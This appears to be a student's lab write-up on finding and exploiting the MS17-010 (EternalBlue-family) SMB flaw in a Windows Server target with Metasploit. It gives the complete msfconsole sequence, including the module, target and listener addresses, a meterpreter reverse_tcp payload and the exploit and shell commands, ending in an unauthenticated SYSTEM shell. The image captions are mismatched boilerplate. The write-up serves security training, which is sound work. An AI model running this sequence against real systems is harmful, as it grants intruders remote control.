<h1>Metasploit - Identifying and Exploiting Vulnerabilities</h1>



<h2>Description</h2>
In this lab, I will explore both the passive nature of vulnerabilities and the dynamic nature of a threat agent performing exploitation. I will assume the role of a system administrator auditing an IT infrastructure, a process that mirrors that of a threat agent attempting to exploit and gain unauthorized access to the system
<br />


<h2>Languages and Utilities Used</h2>

- <b>Metaspoit Framework</b> 

<h2>Environments Used </h2>

- <b>Workstation </b> (Windows Server 2019)
- <b>TargetWindows01 </b> (Windows Server 2019)
- <b>Kali </b> (Linux)

<h2>Identify the Version and Build of a Windows System:</h2>

<p align="center">
From the TargetWindows01 taskbar, Start button > type winver > press Enter to open the About Windows dialog box: <br/>
<br />
<img src="https://i.imgur.com/nGOeJT9.png" height="20%" width="20%" alt="Disk Sanitization Steps"/>
<br />
<br />

<h2>Research and Identify Vulnerabilities:</h2>

<p align="center">
Go to https://cve.mitre.org/ > search for Windows 1607 remote code execution >  look for CVE-2017-0143 in the list: <br/>
<br />
<img src="https://i.imgur.com/nRZvOEF.png" height="70%" width="70%" alt="Disk Sanitization Steps"/>
<br />
<br />

<p align="center">
Now we are going to see if The  > search for microsoft bulletin ms17-010 > open the frist Microsoft blog <br/>
<br />
<img src="https://i.imgur.com/kE43uSn.png" height="70%" width="70%" alt="Disk Sanitization Steps"/>
<br />
<br />

<p align="center">
Go to https://www.rapid7.com/db/ > search <b>ms17-010</b> > open the frist one <br/>
<br />
<img src="https://i.imgur.com/SsodKsR.png" height="70%" width="70%" alt="Disk Sanitization Steps"/>
<br />
<br />


<h2>Exploiting the system:</h2>

<p align="center">
Go to Kali > Log in > open Terminal: <br/>
<br />
<img src="https://i.imgur.com/A5g13fA.png" height="50%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />

<p align="center">
Type <b> msfconsole</b> and press enter <br/>
<br />
<img src="https://i.imgur.com/8TocBOg.png" height="50%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />

<p align="center">
After the prompt appears, type: <b>use exploit/windows/smb/ms17_010_psexec</b>  <br/>
<br />
<img src="https://i.imgur.com/mkJ05MT.png" height="50%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />

<p align="center">
type: <b>set rhosts 172.30.0.3</b> > press enter  <br/>
<br />
This command sets the remote host we want to exploit. In this example, it is Windows Server 2016.
<br />
<br />
<img src="https://i.imgur.com/mkJ05MT.png" height="50%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />

<p align="center">
type: <b>set payload windows/meterpreter/reverse_tcp</b> > press enter  <br/>
<br />
This command determines the payload, which is executed right after successful exploitation.
<br />
<br />
<img src="https://i.imgur.com/gMZvacv.png" height="50%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />


<p align="center">
type: <b>set lhost 172.30.0.4</b> > press enter <br/>
<br />
This command specifies the local IP address that will be ready for connections on the attacker's computer.
<br />
<br />
<img src="https://i.imgur.com/Bvk0n1y.png" height="50%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />

<p align="center">
type: <b>set lport 443</b> > press enter <br/>
<br />
This command sets the local port that will be ready for connections on the attacker's computer. After the exploit is executed, the payload code will let Windows Server 2016 connect to the attacker's machine by using this port
<br />
<br />
<img src="https://i.imgur.com/vvtYJ8U.png" height="50%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />

<p align="center">
type: <b> exploit </b></b> > press enter <br/>
<br />
This command sends the exploit module to the target system.
<br />
<br />
<img src="https://i.imgur.com/vO6ctKS.png" height="50%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />

<p align="center">
type: <b> shell </b></b> > press enter <br/>
<br />
This command allows us to use cmd.exe over meterpreter, meaning that you have now opened a remote shell on TargetWindows01 with the System account. Please note that you didn't need a username or password to do this..
<br />
<br />
<img src="https://i.imgur.com/dm0VT4V.png" height="50%" width="50%" alt="Disk Sanitization Steps"/>
<br />
<br />

<!--
 ```dif
- text in red
+ text in green
! text in orange
# text in gray
@@ text in purple (and bold)@@
```
--!>
